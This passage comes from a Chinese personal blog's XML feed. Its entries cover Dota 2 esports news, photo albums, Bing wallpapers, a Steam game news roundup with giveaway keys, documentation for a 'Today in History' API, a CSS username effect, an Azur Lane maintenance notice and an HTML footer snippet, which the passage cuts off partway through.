你们和XG几几开？</strong></p><p>A：差不多吧，因为和他们训练一直交手也都差不多，不会有很大的差距什么的，互有输赢，看临场发挥吧。</p><p><strong>Q：感谢y队接受我们的采访，也希望你们后面的比赛越打越好。</strong></p><p>A：谢谢。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-84ae875dc6d49961ad08f4c5454ac078.gif"></p><p><strong>HR停止运营DOTA2阵容</strong></p><p>4月2日晚间，刚以7-0战绩取得东欧DPC第一名的HellRaisers突然于官方账号宣布不再运营DOTA2阵容，具体内容如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-aa941dd6f4c5d85661c6f5f955825693.jpeg"></p><p>在过去的一年里，尽管遇到了很多困难，但HR旗下的管理团队和选手都取得了相当好的成绩。我们已经决定停用HR这面旗帜，因为俱乐部现在没有做好积极参与电竞的准备。 包括管理层在内的队伍阵容将保持不变，如果你想继续支持队伍并关注选手个人账号以获取最新消息，我们将非常高兴。谢谢你们和我们在一起。GG，WP！ HellRaisers原为位于基辅的乌克兰俱乐部，但在去年搬迁至塞尔维亚。另据有关人士透露，从技术上来说HR已经不负责旗下DOTA2阵容运营长达一年半了。而且现任经理Maria Gunina女士自去年的DPC第三赛季开始就单独负责HellRaisers的DOTA2阵容，没有俱乐部的支持。经过一番谈判，双方决定：Maria Gunina可以继续使用HellRaisers的队名以吸引赞助商，俱乐部也不再参与任何关于DOTA2阵容的决定，但HellRaisers可以随时停用队名授权。 HellRaisers目前阵容如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-cad390e5c516706522f1fda2a30dec89.png"></p><blockquote><p>本篇文章来源于微信公众号: DOTA2刀塔</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dota2 </tag>
            
            <tag> DPC </tag>
            
            <tag> 游戏 </tag>
            
            <tag> 联赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>今日无他事，赏花，踏青！</title>
      <link href="/937.html"/>
      <url>/937.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/lADPD2eDYpH6fyfNBZ_NBDg_1080_1439-769x1024.jpg" alt="lADPD2eDYpH6fyfNBZ_NBDg_1080_1439"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/lADPJx8Z1JMe_x_NBaDNBDg_1080_1440-768x1024.jpg" alt="lADPJx8Z1JMe_x_NBaDNBDg_1080_1440"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/lADPJxuMVe5ZIszNC7jND6A_4000_3000-1024x768.jpg" alt="lADPJxuMVe5ZIszNC7jND6A_4000_3000"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/lADPD4Bh2RNlcRfNC7jND6A_4000_3000-1024x768.jpg" alt="lADPD4Bh2RNlcRfNC7jND6A_4000_3000"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/lADPJwKt32zmQgfND6DNC7g_3000_4000-768x1024.jpg" alt="lADPJwKt32zmQgfND6DNC7g_3000_4000"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/lADPKGXzV8pvPSvND6DNC7g_3000_4000-768x1024.jpg" alt="lADPKGXzV8pvPSvND6DNC7g_3000_4000"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/lADPKIJfTPCjPUnNC7jND6A_4000_3000-1024x768.jpg" alt="lADPKIJfTPCjPUnNC7jND6A_4000_3000"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/lADPD2eDYpH6fwbNBZ_NBDg_1080_1439-769x1024.jpg" alt="lADPD2eDYpH6fwbNBZ_NBDg_1080_1439"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/lADPKHQpUl2O_xfNBaDNBDg_1080_1440-768x1024.jpg" alt="lADPKHQpUl2O_xfNBaDNBDg_1080_1440"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分享 </tag>
            
            <tag> 春游 </tag>
            
            <tag> 赏花 </tag>
            
            <tag> 踏青 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bing Wallpaper (2021-02)</title>
      <link href="/917.html"/>
      <url>/917.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cn.bing.com/th?id=OHR.TwinsDenning_EN-US9910127756_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.JinliStreet_EN-US9813774321_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.Trevi_EN-US7298856463_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.LeMorneBrabant_EN-US7199520186_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.DalmatianPelicans_EN-US7089551223_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.InvisibleMan_EN-US6967873703_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.Porto_EN-US6858177103_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.AABday_EN-US6703996640_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.Parrotfish_EN-US6474384190_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.VerzascaValley_EN-US6320380092_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.PeritoMorenoArgentina_EN-US6161367346_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.PurpleFlowers_EN-US5664268733_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.Lincoln50MoWA_EN-US4174714087_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.OceanHeart_EN-US5478049854_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.BluebirdsEastern_EN-US5293227470_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.YearoftheOx_EN-US5106152536_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.CentralCaliBlossoms_EN-US0148484264_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.PenitentSnow_EN-US0047515629_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.MoonDogs_EN-US0007581724_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.HeroMural_EN-US9967459324_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.IceWalking_ZH-CN5122217505_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.SuperbOwl_ZH-CN5028336455_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.MountSefton_ZH-CN4956097627_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.TheWave_ZH-CN4856809836_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.VosgesBioReserve_ZH-CN4762694302_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.MountNemrut_ZH-CN4681788604_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.RainbowMarmot_ZH-CN4605973404_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.ToledoIldefonso_ZH-CN4507206651_UHD.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 山海图册 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bing </tag>
            
            <tag> Wallpaper </tag>
            
            <tag> 每日一图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CDPR发布财报：没有新作，但利润大增！《鬼玩人》上架Steam</title>
      <link href="/b0562508.html"/>
      <url>/b0562508.html</url>
      
        <content type="html"><![CDATA[<p><strong>01</strong></p><p>《鬼玩人：游戏》</p><p>发行商Saber Interactive宣布，<strong>《鬼玩人：游戏》年度版</strong>将于4月26日在包括Steam在内的多平台推出，该作此前一直在Epic独占。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-d16f34a70266d41741e62029847ad700.png"></p><p>商店页：s.team&#x2F;a&#x2F;1493750&#x2F;</p><p>这款知名IP合作类型PvP&#x2F;PvE游戏的年度版，将完整的基础游戏与六个DLC的内容捆绑在了一起，包括即将推出的新DLC“Who’s Your Daddy”。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-4e00460bcc4b15ed34cf69787775ab9a.jpeg"></p><p>游戏中玩家将扮演广受欢迎的《鬼玩人》系列中的安旭·威廉姆斯或他的朋友，在游戏中紧密合作，在阴暗世界中探索、掠夺并管理恐惧情绪，寻找关键物品修补破碎世界间的缺口。</p><p>游戏当前在Epic国区售价159元，评分4.4分。</p><p><strong>02</strong></p><p>CDPR</p><p>CDPR日前发布了2022财年业绩报告，虽然2022年中并未推出任何新作，但数据却相当好看——2022财年CDPR销售收入约2.22亿美元，净利润约8000万美元，同比增长了66%。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-e24fc928156b4f394627fa69a959be8e.jpeg"></p><p>能取得这一好成绩的主要原因在于<strong>《赛博朋克2077》</strong>销量增长了，与2021年同期相比，该游戏销量增加18%。首功当归属于《赛博浪客》动画，其播出后非常火爆，吸引更多人购买《赛博朋克2077》。</p><p>CDPR首席执行官Adam表示，其下一个大项目是《赛博朋克2077》DLC“往日之影”。此外，CDPR还计划推出《巫师4》、《巫师：重制版》、《巫师：天狼星计划》等新作。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-f4e58494d93c85f5179fac3abe683274.png"></p><p>CDPR 官方推特也于今日宣布，6月份时他们将公布“往日之影”的更多信息。</p><p><strong>03</strong></p><p>《渔帆暗涌》</p><p>黑暗恐怖风格的钓鱼冒险游戏<strong>《渔帆暗涌》</strong>现已正式发售，Steam国区售价110元。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-1d37bc1e5fd273c98404179e836b725c.png"></p><p>商店页：s.team&#x2F;a&#x2F;1562430&#x2F;</p><p>《渔帆暗涌》是一款有汹涌暗流的单人钓鱼冒险游戏。指挥你的拖网渔船去探索一系列偏远的岛屿及其周遭深海，将你的渔获卖给当地人并完成任务，以更多的了解每个地区动荡的过去。为你的船只配备更好的设备，以便在深海海沟中撒网捕捞并航向遥远的大陆，并在深海中挖掘出埋藏已久的秘密。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-a9e28534564e64743c4707cd264ac856.gif"></p><p>游戏支持中文，当前整体评测为“特别好评”，好评率高达97%。</p><p><strong>04</strong></p><p>《火影忍者 终极风暴羁绊》</p><p>《火影忍者 终极风暴羁绊》Steam页面正式上线，预计2023年发售，支持中文。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-0952037fe4862b45fea4008d08fe30f5.png"></p><p>商店页：s.team&#x2F;a&#x2F;1020790&#x2F;</p><p>该作为忍道对战动作游戏，由万代南梦宫发行。游戏包含角色决斗与故事模式，新增了数个可游玩的角色，以超越动画水准重新编辑鸣人与佐助的故事，以及原创剧情。</p><p><strong>05</strong></p><p>《SYNDUALITY: Echo of Ada》</p><p>万代南梦宫发行的一款机甲题材新作。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-f2e7211900d9de76e74f894b8661ac7b.png"></p><p>商店页：s.team&#x2F;a&#x2F;1245480&#x2F;</p><p>游戏背景设定中，2099年，倾注而下的蓝雨“新月之泪”抹去了全球92%人口，人类只能舍弃地表，在地下建设都市。驾驶二足行走机器人在地表工作的人被称为“漂泊者”。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-2c2e64af0e7988d4adaa0751b5f4ce97.jpeg"></p><p>时间来到2222年，玩家便将在游戏中成为一位漂泊者，在橙珀结晶给予你路线指引、战斗支援、指示与提醒、警告等各种协助的AI搭档“贤士”的协助下，搜集西游资源“橙珀结晶”，并一同对抗名为异形生物“终结者”。在地表遇见其他玩家操作的漂流者时，除了为了抢夺重要的资源而战斗之外，也可能会需要合作对抗终结者。</p><p><strong>06</strong></p><p>《全面坦克战略官》</p><p>505Games 发行的以“二战”为背景的回合制战略游戏<strong>《全面坦克战略官》</strong>现已正式在Steam发售。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-252f63d67f550eaf2f9bee618c9fd188.png"></p><p>商店页：s.team&#x2F;a&#x2F;1770050&#x2F;</p><p>玩家将可以在游戏中化身著名将领，从数十种作战单位中决定如何排兵布阵，选择合适的时机，全力以赴发动攻击，或者选择合适的时机潜伏，补充物资并埋伏敌人。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-16056881ef97de8d08ca46e04e874883.jpeg"></p><p>游戏售价98元，支持中文，可惜发售一天后Steam商店测评数依旧寥寥无几。</p><p><strong>07</strong></p><p>《庆余年》</p><p>根据猫腻同名小说正版IP授权的MMO角色扮演游戏《庆余年》商家Steam商店，免费游玩，发售时间待定。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-aac24c399b27ae08a1880d25e6e0f0a7.png"></p><p>商店页：s.team&#x2F;a&#x2F;1562430&#x2F;</p><p>据介绍，游戏剧情深度还原，扎根于《庆余年》电视剧，营造电视剧剧情爽快体验，玩家不仅可以体验庆庙鸡腿夫妇相遇、牛栏街范闲遇刺、祈年殿夜宴斗酒诗百篇等诸多名场面，更可与高冷五竹、财迷王启年、花魁司理理等众多角色交互，成为彼此的羁绊。</p><p>游戏战斗讲求“自由”与“策略性”，多种战斗机制，各种搭配招式可以自由组合；战斗中可自由切换武器；还有着特色轻功战斗与伙伴共战等玩法。</p><p><strong>08</strong></p><p>《重塑火星》</p><p>以开发火星为主题的模拟策略游戏<strong>《重塑火星》</strong>，已于3月31日在Steam发布正式版，首周特惠25.6元。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-cc815f6862fa5c065260e770e8335ad5.png"></p><p>商店页：s.team&#x2F;a&#x2F;1395760&#x2F;</p><p>本作由国内开发者一顿山丘独立制作，玩家将扮演改造火星的总工程师，在火星上大搞基建、开山挖矿、建设工厂，最终将火星改造为宜居家园。</p><p>游戏支持中文，当前整体评测为“特别好评”，好评率86%。</p><p><strong>09</strong></p><p>每日福利</p><p>每天都送喜加一KEY，“点赞”+“在看”的百位数之和，决定第二天中有几个好游戏！</p><p>▲向上滑动</p><p>CQBJZ-03NFM-JNTL5</p><p>BZ4LL-04LKJ-4?QVM</p><p>QDKQT-F6V9A-JC5JD</p><p>VC6E7-LE9Y8-X?QDX</p><p>ZLYY7-XBMJH-H9XNW</p><p>P88GI-8BNMV-8ZK?Z</p><p>44ELN-B06Q8-AK688</p><p>YXE57-8JPJV-Z?HCA</p><p>QBIBM-2D9BM-QI7V4</p><p>GFP3D-FKZRX-?CT58</p><p><strong>激活方式：</strong></p><p>登录Steam，点击左下角“添加游戏”</p><p>点击“在Steam上激活产品”</p><p>（本期包含10个《永歌》</p><p>CDKEY中问号为0~6随机数字）</p><blockquote><p>本篇文章来源于微信公众号: Steam游戏日夜</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> steam </tag>
            
            <tag> 新闻 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>历史上的今天 API</title>
      <link href="/e31977d8.html"/>
      <url>/e31977d8.html</url>
      
        <content type="html"><![CDATA[<h1 id="Today-in-History"><a href="#Today-in-History" class="headerlink" title="Today in History"></a>Today in History</h1><p>历史上的今天 API，数据来源：<a href="https://baike.baidu.com/calendar/">百科·历史上的今天</a></p><h2 id="API"><a href="#API" class="headerlink" title="API"></a><a href="https://github.com/gongjuecloak/today-in-history#api"></a>API</h2><p>地址：<a href="https://gjcloak-history.deno.dev/">https://gjcloak-history.deno.dev/</a></p><p>api</p><p>method</p><p>params</p><p>desc</p><p><code>/</code></p><p>GET</p><p>无参</p><p>默认返回当天的数据</p><p><code>/</code></p><p>GET</p><p><code>?month=5&amp;day=1</code></p><p>返回 5 月 1 日的数据</p><p>请求成功，返回数据格式：</p><p>{<br>  “status”: 200,<br>  “message”: “OK: 3:48:35 PM GMT+8”,<br>  “data”: [<br>    {<br>    “year”: “1469”,<br>    “title”: “葡萄牙国王曼努埃尔一世逝世”,<br>    “desc”: “曼努埃尔一世·科穆宁（希腊语：Μανουήλ Α’ ο Κομνηνός ，1118年11月28日－1180年9月24日）拜占庭帝国科穆”,<br>    “link”: “<a href="https://baike.baidu.com/item/%E6%9B%BC%E5%8A%AA%E5%9F%83%E5%B0%94%E4%B8%80%E4%B8%96">https://baike.baidu.com/item/%E6%9B%BC%E5%8A%AA%E5%9F%83%E5%B0%94%E4%B8%80%E4%B8%96</a>“<br>    },<br>    …<br>  ]<br>}</p><p>缺少参数或者传入日期格式有误，返回错误信息：</p><ul><li><p><code>/?month=2&amp;day=31</code></p><p>{<br>  “status”: 404,<br>  “message”: “month 和 day 不匹配！”,<br>  “data”: null<br>}</p></li><li><p><code>/?month=12</code></p><p>{<br>  “status”: 400,<br>  “message”: “请传入正确的参数！”,<br>  “data”: null<br>}</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分享 </tag>
            
            <tag> api </tag>
            
            <tag> 历史上的今天 </tag>
            
            <tag> 接口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>满朝文武竟无一人敢言？</title>
      <link href="/888.html"/>
      <url>/888.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/03/lADPJwY7XfgjVgHNBLDNA4A_896_1200-765x1024.jpg" alt="lADPJwY7XfgjVgHNBLDNA4A_896_1200"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/03/lADPJwnI3Jzp1i7NBy3NBVY_1366_1837-761x1024.jpg" alt="lADPJwnI3Jzp1i7NBy3NBVY_1366_1837"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/03/lADPJwnI3Jzp1f_NCADNBOw_1260_2048-630x1024.jpg" alt="lADPJwnI3Jzp1f_NCADNBOw_1260_2048"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/03/lADPKHtET42N1gbNBLDNA4A_896_1200-765x1024.jpg" alt="lADPKHtET42N1gbNBLDNA4A_896_1200"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/03/lADPKHe20OjA9FHNCADNBVY_1366_2048-683x1024.jpg" alt="lADPKHe20OjA9FHNCADNBVY_1366_2048"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/03/lADPKH7RzjJUVhLNEADNCqo_2730_4096-683x1024.jpg" alt="lADPKH7RzjJUVhLNEADNCqo_2730_4096"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/03/lADPKGmA1lWtVfHNCADNBVY_1366_2048-683x1024.jpg" alt="lADPKGmA1lWtVfHNCADNBVY_1366_2048"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/03/lADPJxuMVdTKVgvNCADNBVY_1366_2048-683x1024.jpg" alt="lADPJxuMVdTKVgvNCADNBVY_1366_2048"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/03/lADPJxuMVdTKVezNBVfNCAA_2048_1367-1024x684.jpg" alt="lADPJxuMVdTKVezNBVfNCAA_2048_1367"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/03/lADPJxf-1zAD1ivNEADNCqs_2731_4096-683x1024.jpg" alt="lADPJxf-1zAD1ivNEADNCqs_2731_4096"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/03/lADPJxDj2eZ21ffNCADNBVU_1365_2048-683x1024.jpg" alt="lADPJxDj2eZ21ffNCADNBVU_1365_2048"></p>]]></content>
      
      
      <categories>
          
          <category> 山海图册 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二次元 </tag>
            
            <tag> cosplay </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>子比主题美化-全站用户名称流光特效</title>
      <link href="/861.html"/>
      <url>/861.html</url>
      
        <content type="html"><![CDATA[<p>代码放到css样式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/*流光名字*/</span><br><span class="line">.display-name &#123;</span><br><span class="line">    background-image: -webkit-linear-gradient(90deg, #07c160, #fb6bea 25%, #3aedff 50%, #fb6bea 75%, #28d079);</span><br><span class="line">    -webkit-text-fill-color: transparent;</span><br><span class="line">    -webkit-background-clip: text;</span><br><span class="line">    background-size: 100% 600%;</span><br><span class="line">    animation: wzw 10s linear infinite;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@keyframes wzw &#123;</span><br><span class="line">    0% &#123;</span><br><span class="line">        background-position: 0 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    100% &#123;</span><br><span class="line">        background-position: 0 -300%;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 子比美化 </tag>
            
            <tag> wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>「一锤！Burin！」即将开启！3月31日（周五）13:00港区改建！  ​​​</title>
      <link href="/52ef69f3.html"/>
      <url>/52ef69f3.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-48a17eed48ce719571b341ed187c1d77.jpeg"></p><p>各位亲爱的指挥官：</p><p>    司令部将于<strong>3月31日（周五）****13:00~16:00</strong>对以下港区进行为期3小时的改造建设（如有变动将会另行发布通知）。改建期间将暂时无法进入港区，还请各位指挥官提前做好下线准备，给各位带来的不便敬请谅解。</p><p><strong>涉及港区</strong></p><p><strong>安卓全港区、iOS全港区</strong></p><p><strong>改建内容</strong></p><p><strong>一、内容新增</strong></p><p>1.开启限时活动「一锤！Burin！」，活动时间4月1日0点~4月6日维护<br>活动期间收集神器的线索，解锁特别关卡。挑战关卡可获得神秘的强力装备！</p><p><strong>二、内容调整</strong></p><p>1.调整了誓约系统，调整后：</p><p>①成功缔结誓约的角色，其角色名在船坞等界面将使用特殊颜色显示；</p><p>※ 可在「设置」-「誓约角色名特殊显示」中关闭此功能</p><p>② 指挥官可在船坞-角色誓约界面中为已缔结誓约的角色更换角色特殊边框；</p><p>※ 仅可选择一位角色更换特殊边框；</p><p>※ 默认展示最近誓约角色的特殊边框；</p><p>③「誓约之戒」将更名为「永恒礼盒」；</p><p>④ 调整了「永恒礼盒」的图标；</p><p>2.调整了「大舰队」-「成员」界面的角色立绘展示，调整后将固定显示为圣路易斯或莉普莎，且不再展示其他舰队成员的签名；</p><p>3.调整了怨仇、椿、椿·改、天狼星、明尼阿波利斯、马萨诸塞、赫莉米娜亲王、半人马、鳄、腓德雷卡大帝、布丽吉特、萨沃伊亲王、阿尔芙莉达、芙兰希卡、佩特菈·斯坦贝瑟、莉泽洛特、妮米、妮娅的立绘及部分Q版资源；</p><p>4.调整了椿·改、怨仇、鳄、腓德雷卡大帝的动态立绘资源；</p><p>5.调整了埃格妮丝换装「金龙腾祥云」、奥德莉亚换装「铁血的辉光」、腓德雷卡大帝换装「摇篮的Zeremonie」、印第安纳波利斯换装「环城之夜」、孟菲斯换装「Mystical Night」、荙换装「夜宴微醺」、怨仇换装「办公室的“意外”」、 亚利桑那换装「异域的舞姬」、雅努斯换装「踌躇的换衣时间」、棭换装「海边嬉戏时间」、胜利换装「春之女神」、卡律布狄斯换装「清凉的水花」、㭴换装「温泉放松时间」、华甲换装「欢乐喜庆僵尸夜」、定安换装「红红火火度勤春」、布莱默顿换装「功夫少女！」、标枪换装「微速前进！」的换装立绘及部分Q版资源；</p><p><strong>三、问题修复</strong></p><p>1.修复了部分角色索敌机制错误的问题；</p><p>&gt;&gt;本次维护调整内容补偿&lt;&lt;</p><p>非常抱歉本次调整给大家带来的不便，对此司令部表示诚挚的歉意。司令部将于下次维护后将向全港区发放【钻石x800】的调整补偿，届时还请指挥官们注意查收。</p><p>感谢指挥官们一直以来的支持与理解。</p><p><strong>改建补偿</strong></p><p>石油x1200、物资x2800</p><p><strong>发放时间</strong></p><p>2023年3月31日维护期间</p><p><strong>发放对象</strong></p><p>2023年3月31日维护前注册并创建角色的玩家</p><blockquote><p>本篇文章来源于微信公众号: 碧蓝航线手游</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 指挥官 </tag>
            
            <tag> 港区 </tag>
            
            <tag> 碧蓝航线 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>给博客底部添加通用底部导航栏</title>
      <link href="/846.html"/>
      <url>/846.html</url>
      
        <content type="html"><![CDATA[<p>效果预览：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/03/image-13-1024x50.png" alt="image"></p><p>只需要把下列代码压缩后放入 自定义底部HTML代码 里即可</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/03/image-14-1024x288.png" alt="image"></p><p>[hidecontent type&#x3D;”logged” desc&#x3D;”隐藏内容：登录后可查看”]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type=&quot;text/css&quot;&gt;@media screen and (max-width:768px)&#123;.pc-down&#123;display:none;&#125;&#125;&lt;/style&gt;</span><br><span class="line">&lt;div class=&quot;pc-down&quot;&gt;</span><br><span class="line">    &lt;script src=&quot;https://cdn.nesxc.com/js/down-icon.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;div class=&quot;footwaveline&quot;&gt;&lt;i style=&quot;background-image: url(https://cos.gjcloak.xyz/pigo/202302200813397.png?imageMogr2/format/webp/interlace/1/quality/80);width: 200px;height: 58px;position: fixed;bottom: 0;z-index: 110;background-size: 100%;&quot;&gt;&lt;/i&gt;</span><br><span class="line">        &lt;div class=&quot;footwavewave&quot; style=&quot;background: url(https://cos.gjcloak.xyz/pigo/202303301140324.png?imageMogr2/format/webp/interlace/1/quality/0) 0 0 repeat-x;height: 3px;width: 100%;position: fixed;background-size: 10px 3px;z-index: 98;bottom: 30px;&quot;&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;pc-down-text&quot; style=&quot;width: 100%;height: 30px;position: fixed;bottom: 0;z-index: 97;box-shadow: 0 -2px 10px rgb(0 0 0 / 10%);background:#fff;&quot;&gt;</span><br><span class="line">        &lt;nav class=&quot;pc-down-main&quot; style=&quot;float: right;margin-right: 50px;margin-top: -7px;&quot;&gt;</span><br><span class="line">            &lt;span class=&quot;pc-down-main-text&quot; style=&quot;display: inline-block;margin-top: 10px;margin-left: 10px;font-size: 18px;&quot;&gt;</span><br><span class="line">                &lt;svg class=&quot;iconfont&quot; aria-hidden=&quot;true&quot;&gt;&lt;use xlink:href=&quot;#icon-pengyouquan&quot;&gt;&lt;/use&gt;&lt;/svg&gt;&lt;a href=&quot;/links&quot;&gt;友情链接&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">            &lt;span class=&quot;pc-down-main-text&quot; style=&quot;display: inline-block;margin-top: 10px;margin-left: 10px;font-size: 18px;&quot;&gt;</span><br><span class="line">                &lt;svg class=&quot;iconfont&quot; aria-hidden=&quot;true&quot;&gt;&lt;use xlink:href=&quot;#icon-liuyan&quot;&gt;&lt;/use&gt;&lt;/svg&gt;&lt;a href=&quot;/content&quot;&gt;在线留言&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">            &lt;span class=&quot;pc-down-main-text&quot; style=&quot;display: inline-block;margin-top: 10px;margin-left: 10px;font-size: 18px;&quot;&gt;</span><br><span class="line">                &lt;svg class=&quot;iconfont&quot; aria-hidden=&quot;true&quot;&gt;&lt;use xlink:href=&quot;#icon-canbaozhuangtai&quot;&gt;&lt;/use&gt;&lt;/svg&gt;&lt;a href=&quot;https://v6.51.la/s/Kth3jvIRhezMegB&quot;&gt;页面在线情况&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">            &lt;span class=&quot;pc-down-main-text&quot; style=&quot;display: inline-block;margin-top: 10px;margin-left: 10px;font-size: 18px;&quot;&gt;</span><br><span class="line">                &lt;svg class=&quot;iconfont&quot; aria-hidden=&quot;true&quot;&gt;&lt;use xlink:href=&quot;#icon-SSLzhengshu&quot;&gt;&lt;/use&gt;&lt;/svg&gt;&lt;a 